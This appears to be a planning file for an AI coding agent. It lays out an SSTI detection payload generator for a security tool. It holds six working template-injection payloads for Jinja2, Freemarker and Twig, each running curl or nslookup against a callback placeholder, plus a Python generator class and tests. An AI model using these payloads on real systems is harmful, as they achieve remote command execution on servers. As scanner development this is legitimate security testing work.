---
phase: 06-vulnerability-payloads
plan: 03
type: execute
wave: 1
depends_on: []
files_modified:
  - ricochet/payloads/ssti.py
  - ricochet/payloads/builtin/ssti-jinja2.txt
  - ricochet/payloads/builtin/ssti-freemarker.txt
  - ricochet/payloads/builtin/ssti-twig.txt
autonomous: true

must_haves:
  truths:
    - "SSTI payloads use template engine command execution to trigger callbacks"
    - "Each major template engine has at least 2 payload variants"
    - "Payloads execute curl/wget/nslookup to phone home"
  artifacts:
    - path: "ricochet/payloads/ssti.py"
      provides: "SSTI payload generator class"
      exports: ["SSTIPayloadGenerator"]
    - path: "ricochet/payloads/builtin/ssti-jinja2.txt"
      provides: "Jinja2 SSTI payloads using lipsum/cycler"
      min_lines: 2
    - path: "ricochet/payloads/builtin/ssti-freemarker.txt"
      provides: "Freemarker SSTI payloads using Execute"
      min_lines: 2
    - path: "ricochet/payloads/builtin/ssti-twig.txt"
      provides: "Twig SSTI payloads using sort filter"
      min_lines: 2
  key_links:
    - from: "ricochet/payloads/ssti.py"
      to: "ricochet/payloads/builtin/ssti-*.txt"
      via: "load_payloads with engine-specific files"
      pattern: "ssti-"
---

<objective>
Create SSTI payload generator for server-side template injection detection

Purpose: Generate SSTI payloads that execute system commands to trigger callbacks when processed by template engines. These detect template injection vulnerabilities by having the server execute curl/wget/nslookup to phone home.

Output: SSTIPayloadGenerator class + 6 SSTI payloads (2 per major template engine)
</objective>

<execution_context>
@~/.claude/get-shit-done/workflows/execute-plan.md
@~/.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/PROJECT.md
@.planning/ROADMAP.md
@.planning/STATE.md
@.planning/phases/06-vulnerability-payloads/06-RESEARCH.md

@ricochet/injection/payloads.py
</context>

<tasks>

<task type="auto">
  <name>Task 1: Create SSTI builtin payload files</name>
  <files>
    ricochet/payloads/builtin/ssti-jinja2.txt
    ricochet/payloads/builtin/ssti-freemarker.txt
    ricochet/payloads/builtin/ssti-twig.txt
  </files>
  <action>
Create 3 template engine-specific payload files with 2 payloads each:

1. `ssti-jinja2.txt` - Jinja2/Flask template injection:
```
# Jinja2 SSTI payloads - Python template engine (Flask, Django)
# {{CALLBACK}} replaced with callback URL
{{ lipsum.__globals__["os"].popen("curl {{CALLBACK}}").read() }}
{{ lipsum.__globals__["os"].popen("nslookup {{CALLBACK}}").read() }}
```

2. `ssti-freemarker.txt` - Freemarker template injection (Java):
```
# Freemarker SSTI payloads - Java template engine
# {{CALLBACK}} replaced with callback URL
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl {{CALLBACK}}")}
${"freemarker.template.utility.Execute"?new()("nslookup {{CALLBACK}}")}
```

3. `ssti-twig.txt` - Twig template injection (PHP):
```
# Twig SSTI payloads - PHP template engine (Symfony)
# {{CALLBACK}} replaced with callback URL
{{ ['curl {{CALLBACK}}','']|sort('system') }}
{{ ['nslookup {{CALLBACK}}','']|sort('system') }}
```

Important: These payloads execute system commands. The curl/nslookup variants provide HTTP and DNS callback options respectively. Preserve exact syntax from research - template engines are syntax-sensitive.
  </action>
  <verify>
```bash
wc -l ricochet/payloads/builtin/ssti-*.txt
```
Each file should have 4+ lines (2 comments + 2 payloads).
  </verify>
  <done>
- 3 template engine payload files created
- Each has 2 payloads (curl and nslookup variants)
- Comments identify template engine type
  </done>
</task>

<task type="auto">
  <name>Task 2: Create SSTI payload generator with engine selection</name>
  <files>
    ricochet/payloads/ssti.py
    tests/test_payloads_ssti.py
  </files>
  <action>
Create SSTIPayloadGenerator class following same pattern as SQLi:

```python
class SSTIPayloadGenerator:
    vuln_type = "ssti"
    ENGINES = ["jinja2", "freemarker", "twig"]

    def __init__(self, engine: Optional[str] = None):
        """
        Args:
            engine: Specific template engine to target (jinja2, freemarker, twig).
                   If None, generates payloads for all engines.
        """
        self.engine = engine

    def generate(self, callback_url: str) -> Iterator[tuple[str, str]]:
        """Yield (payload, engine) tuples."""
        builtin_dir = Path(__file__).parent / "builtin"

        engines = [self.engine] if self.engine else self.ENGINES

        for eng in engines:
            filepath = builtin_dir / f"ssti-{eng}.txt"
            if filepath.exists():
                for payload in load_payloads(filepath):
                    yield (payload, eng)
```

Also create tests in `tests/test_payloads_ssti.py`:
- Test generates payloads for all engines when no engine specified
- Test generates only specific engine payloads when engine specified
- Test all payloads contain {{CALLBACK}} placeholder
- Test vuln_type returns "ssti"
- Test minimum 6 total payloads (2 per engine)
  </action>
  <verify>
```bash
python -c "from ricochet.payloads.ssti import SSTIPayloadGenerator; g = SSTIPayloadGenerator(); print(list(g.generate('http://test'))[:3])"
python -m pytest tests/test_payloads_ssti.py -v
```
  </verify>
  <done>
- SSTIPayloadGenerator class importable
- Generates payloads for all 3 template engines
- Engine-specific filtering works
- Tests pass
  </done>
</task>

</tasks>

<verification>
```bash
# Payload files exist with content
ls -la ricochet/payloads/builtin/ssti-*.txt

# Generator produces payloads for all engines
python -c "from ricochet.payloads.ssti import SSTIPayloadGenerator; g = SSTIPayloadGenerator(); payloads = list(g.generate('http://test')); print(f'{len(payloads)} SSTI payloads across engines'); engines = set(p[1] for p in payloads); print(f'Engines: {engines}')"

# Engine-specific mode works
python -c "from ricochet.payloads.ssti import SSTIPayloadGenerator; g = SSTIPayloadGenerator('jinja2'); payloads = list(g.generate('http://test')); assert all(p[1] == 'jinja2' for p in payloads); print(f'{len(payloads)} Jinja2 payloads')"

# Tests pass
python -m pytest tests/test_payloads_ssti.py -v
```
</verification>

<success_criteria>
- SSTIPayloadGenerator class exists with engine parameter
- Generates at least 6 SSTI payloads (2 per engine)
- All payloads contain {{CALLBACK}} placeholder
- Engine-specific filtering works correctly
- vuln_type property returns "ssti"
- Tests verify generator behavior
</success_criteria>

<output>
After completion, create `.planning/phases/06-vulnerability-payloads/06-03-SUMMARY.md`
</output>
